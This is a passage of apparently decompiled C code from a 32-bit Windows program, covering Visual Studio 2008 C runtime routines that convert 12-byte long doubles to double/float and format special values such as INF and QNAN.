    }
    else {
      if (DAT_00423144 < iVar14) {
        if (iVar14 < DAT_00423140) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_00423154;
          iVar4 = (int)(DAT_0042314c + ((int)DAT_0042314c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042314c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042314c + ((int)DAT_0042314c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042314c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_00423154 + DAT_00423140;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00419864;
      }
      local_14 = DAT_00423144 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00423148 - 1;
      iVar14 = (int)(DAT_00423148 + ((int)DAT_00423148 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00423148 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00419650;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00419650:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042314c + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00419864:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042314c & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00423150 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00423150 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00419da8;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00423160 - 1;
    iVar6 = (int)(DAT_00423160 + ((int)DAT_00423160 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00423160 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_004199dc;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_004199e3;
LAB_004199dc:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_004199e3:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_004199f1;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_004199f1:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042315c - DAT_00423160)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042315c < iVar14) {
        if (iVar14 < DAT_00423158) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042316c;
          iVar4 = (int)(DAT_00423164 + ((int)DAT_00423164 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00423164 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_00423164 + ((int)DAT_00423164 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00423164 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042316c + DAT_00423158;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00419da8;
      }
      local_14 = DAT_0042315c - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00423160 - 1;
      iVar14 = (int)(DAT_00423160 + ((int)DAT_00423160 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00423160 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00419b94;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00419b94:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_00423164 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00419da8:
  uVar13 = iVar14 << (0x1fU - (char)DAT_00423164 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00423168 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00423168 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// WARNING: Removing unreachable block (ram,0x0041a0ad)
// WARNING: Removing unreachable block (ram,0x0041a076)
// WARNING: Removing unreachable block (ram,0x0041a45e)
// WARNING: Removing unreachable block (ram,0x0041a085)
// WARNING: Removing unreachable block (ram,0x0041a08d)
// WARNING: Removing unreachable block (ram,0x0041a093)
// WARNING: Removing unreachable block (ram,0x0041a096)
// WARNING: Removing unreachable block (ram,0x0041a09d)
// WARNING: Removing unreachable block (ram,0x0041a0a7)
// WARNING: Removing unreachable block (ram,0x0041a102)
// WARNING: Removing unreachable block (ram,0x0041a0fc)
// WARNING: Removing unreachable block (ram,0x0041a108)
// WARNING: Removing unreachable block (ram,0x0041a125)
// WARNING: Removing unreachable block (ram,0x0041a127)
// WARNING: Removing unreachable block (ram,0x0041a12f)
// WARNING: Removing unreachable block (ram,0x0041a132)
// WARNING: Removing unreachable block (ram,0x0041a137)
// WARNING: Removing unreachable block (ram,0x0041a13a)
// WARNING: Removing unreachable block (ram,0x0041a467)
// WARNING: Removing unreachable block (ram,0x0041a145)
// WARNING: Removing unreachable block (ram,0x0041a47e)
// WARNING: Removing unreachable block (ram,0x0041a485)
// WARNING: Removing unreachable block (ram,0x0041a150)
// WARNING: Removing unreachable block (ram,0x0041a163)
// WARNING: Removing unreachable block (ram,0x0041a165)
// WARNING: Removing unreachable block (ram,0x0041a172)
// WARNING: Removing unreachable block (ram,0x0041a177)
// WARNING: Removing unreachable block (ram,0x0041a17d)
// WARNING: Removing unreachable block (ram,0x0041a186)
// WARNING: Removing unreachable block (ram,0x0041a18d)
// WARNING: Removing unreachable block (ram,0x0041a1a5)
// WARNING: Removing unreachable block (ram,0x0041a1b6)
// WARNING: Removing unreachable block (ram,0x0041a1c4)
// WARNING: Removing unreachable block (ram,0x0041a203)
// WARNING: Removing unreachable block (ram,0x0041a20c)
// WARNING: Removing unreachable block (ram,0x0041a424)
// WARNING: Removing unreachable block (ram,0x0041a21a)
// WARNING: Removing unreachable block (ram,0x0041a224)
// WARNING: Removing unreachable block (ram,0x0041a43f)
// WARNING: Removing unreachable block (ram,0x0041a231)
// WARNING: Removing unreachable block (ram,0x0041a238)
// WARNING: Removing unreachable block (ram,0x0041a242)
// WARNING: Removing unreachable block (ram,0x0041a247)
// WARNING: Removing unreachable block (ram,0x0041a257)
// WARNING: Removing unreachable block (ram,0x0041a25c)
// WARNING: Removing unreachable block (ram,0x0041a266)
// WARNING: Removing unreachable block (ram,0x0041a26b)
// WARNING: Removing unreachable block (ram,0x0041a27d)
// WARNING: Removing unreachable block (ram,0x0041a28a)
// WARNING: Removing unreachable block (ram,0x0041a299)
// WARNING: Removing unreachable block (ram,0x0041a2a6)
// WARNING: Removing unreachable block (ram,0x0041a2c3)
// WARNING: Removing unreachable block (ram,0x0041a2c7)
// WARNING: Removing unreachable block (ram,0x0041a2ce)
// WARNING: Removing unreachable block (ram,0x0041a2d7)
// WARNING: Removing unreachable block (ram,0x0041a2da)
// WARNING: Removing unreachable block (ram,0x0041a2eb)
// WARNING: Removing unreachable block (ram,0x0041a2f9)
// WARNING: Removing unreachable block (ram,0x0041a304)
// WARNING: Removing unreachable block (ram,0x0041a30b)
// WARNING: Removing unreachable block (ram,0x0041a336)
// WARNING: Removing unreachable block (ram,0x0041a33b)
// WARNING: Removing unreachable block (ram,0x0041a346)
// WARNING: Removing unreachable block (ram,0x0041a34f)
// WARNING: Removing unreachable block (ram,0x0041a355)
// WARNING: Removing unreachable block (ram,0x0041a358)
// WARNING: Removing unreachable block (ram,0x0041a37e)
// WARNING: Removing unreachable block (ram,0x0041a383)
// WARNING: Removing unreachable block (ram,0x0041a388)
// WARNING: Removing unreachable block (ram,0x0041a395)
// WARNING: Removing unreachable block (ram,0x0041a3a6)
// WARNING: Removing unreachable block (ram,0x0041a3d7)
// WARNING: Removing unreachable block (ram,0x0041a3ac)
// WARNING: Removing unreachable block (ram,0x0041a3d2)
// WARNING: Removing unreachable block (ram,0x0041a3b6)
// WARNING: Removing unreachable block (ram,0x0041a3cc)
// WARNING: Removing unreachable block (ram,0x0041a3c5)
// WARNING: Removing unreachable block (ram,0x0041a3da)
// WARNING: Removing unreachable block (ram,0x0041a407)
// WARNING: Removing unreachable block (ram,0x0041a3e4)
// WARNING: Removing unreachable block (ram,0x0041a26f)
// WARNING: Removing unreachable block (ram,0x0041a24c)
// WARNING: Removing unreachable block (ram,0x0041a442)
// WARNING: Removing unreachable block (ram,0x0041a188)
// WARNING: Removing unreachable block (ram,0x0041a44c)
// WARNING: Removing unreachable block (ram,0x0041a48d)

void __cdecl
FUN_00419deb(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  
  uVar2 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x00419e7e. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)PTR_LAB_0041a4b3)();
  return;
}



// WARNING: Removing unreachable block (ram,0x0041aa1e)
// WARNING: Removing unreachable block (ram,0x0041aa28)
// WARNING: Removing unreachable block (ram,0x0041aa2d)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2008 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  errno_t eVar7;
  ushort *puVar8;
  ushort uVar9;
  ushort uVar10;
  int *piVar11;
  int iVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  int *local_6c;
  undefined *local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar4 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar9 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar9 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    iVar2 = iVar4;
    goto LAB_0041adbb;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar9 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_0041a619;
        pcVar26 = s_1_INF_004204d0;
      }
      else {
        if (param_1 != 0) {
LAB_0041a619:
          pcVar26 = s_1_QNAN_004204c8;
          goto LAB_0041a61e;
        }
        pcVar26 = s_1_IND_004204d8;
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = s_1_SNAN_004204e0;
LAB_0041a61e:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_0041adbb;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
